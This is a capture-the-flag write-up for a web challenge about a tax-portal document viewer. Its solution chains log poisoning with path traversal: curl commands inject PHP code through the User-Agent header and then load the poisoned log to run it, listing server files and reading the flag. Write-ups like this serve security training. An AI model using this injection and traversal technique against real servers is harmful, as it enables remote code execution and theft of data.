The tax portal’s document viewer seems straightforward, but sometimes what gets logged can come back to bite. Can you find a way to leverage the site’s logging mechanism to access sensitive information on the server?

author: ivy

http:/31.97.187.222:44442/

## Solution

```
$ curl -X POST 'http://localhost:7289/auth/login.php' -A '<?php var_dump(scandir('\''/var/www/'\'')); ?>'; curl 'http://localhost:7289/tax/view.php?doc=....%2F%2Fstorage%2Flogs%2Fapp.log'
<!doctype html><meta charset="utf-8">
<title>Login Failed</title>
<p>Invalid credentials. <br><a href="/">Back</a></p>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tax Document Viewer</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;margin:32px;line-height:1.6}
    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
    a{color:#0b57d0;text-decoration:none} a:hover{text-decoration:underline}
    .doc{border:1px solid #ddd;border-radius:10px;padding:16px;box-shadow:0 1px 2px rgba(0,0,0,.05)}
    .hint{background:#f7fafc;border:1px dashed #cbd5e1;padding:12px;border-radius:10px;margin:16px 0}
    .blob{
      white-space: pre-wrap;
      overflow-x: auto;
      background: #0f172a;
      color: #e5e7eb;
      padding: 12px;
      border-radius: 12px;
      font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
      font-size: 14px;
      line-height: 1.5;
      border: 1px solid #1f2937;
    }
  </style>
</head>
<body>
  <header>
    <h1>Tax Document Viewer</h1>
    <nav><a href="/">Home</a></nav>
  </header>

  <div class="hint">
    <strong>Info:</strong> You are viewing: <code>../storage/logs/app.log</code>
  </div>

  <div class="doc">
    <pre class="blob">[22:53:20] array(8) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(36) "1e64cc2b707e7468e67a3f0c61b1f8f0.txt"
  [3]=>
  string(9) "documents"
  [4]=>
  string(4) "html"
  [5]=>
  string(6) "public"
  [6]=>
  string(3) "src"
  [7]=>
  string(7) "storage"
}
</pre>  </div>

  <p class="hint">
    Quick links:
    <a href="/tax/view.php?doc=2024/annual_tax_2024_summary.php">2024 Summary</a> ·
    <a href="/tax/view.php?doc=2024/npwp_2024_abc123.php">2024 NPWP</a> ·
    <a href="/tax/view.php?doc=2023/receipt_2023_001.php">2023 Receipt</a> ·
    <a href="/tax/view.php?doc=2023/invoice_2023_445.php">2023 Invoice</a>
  </p>
</body>
</html>

$ curl -X POST 'http://localhost:7289/auth/login.php' -A '<?php include("/var/www/1e64cc2b707e7468e67a3f0c61b1f8f0.txt"); ?>'; curl 'http://localhost:7289/tax/view.php?doc=....%2F%2Fstorage%2Flogs%2Fapp.log'
<!doctype html><meta charset="utf-8">
<title>Login Failed</title>
<p>Invalid credentials. <br><a href="/">Back</a></p>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tax Document Viewer</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;margin:32px;line-height:1.6}
    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
    a{color:#0b57d0;text-decoration:none} a:hover{text-decoration:underline}
    .doc{border:1px solid #ddd;border-radius:10px;padding:16px;box-shadow:0 1px 2px rgba(0,0,0,.05)}
    .hint{background:#f7fafc;border:1px dashed #cbd5e1;padding:12px;border-radius:10px;margin:16px 0}
    .blob{
      white-space: pre-wrap;
      overflow-x: auto;
      background: #0f172a;
      color: #e5e7eb;
      padding: 12px;
      border-radius: 12px;
      font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
      font-size: 14px;
      line-height: 1.5;
      border: 1px solid #1f2937;
    }
  </style>
</head>
<body>
  <header>
    <h1>Tax Document Viewer</h1>
    <nav><a href="/">Home</a></nav>
  </header>

  <div class="hint">
    <strong>Info:</strong> You are viewing: <code>../storage/logs/app.log</code>
  </div>

  <div class="doc">
    <pre class="blob">[22:53:20] array(8) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(36) "1e64cc2b707e7468e67a3f0c61b1f8f0.txt"
  [3]=>
  string(9) "documents"
  [4]=>
  string(4) "html"
  [5]=>
  string(6) "public"
  [6]=>
  string(3) "src"
  [7]=>
  string(7) "storage"
}
[22:53:36] BEECTF{LF1_t0_RC3_V14_L09_P01S0N1N9}</pre>  </div>

  <p class="hint">
    Quick links:
    <a href="/tax/view.php?doc=2024/annual_tax_2024_summary.php">2024 Summary</a> ·
    <a href="/tax/view.php?doc=2024/npwp_2024_abc123.php">2024 NPWP</a> ·
    <a href="/tax/view.php?doc=2023/receipt_2023_001.php">2023 Receipt</a> ·
    <a href="/tax/view.php?doc=2023/invoice_2023_445.php">2023 Invoice</a>
  </p>
</body>
</html>
```
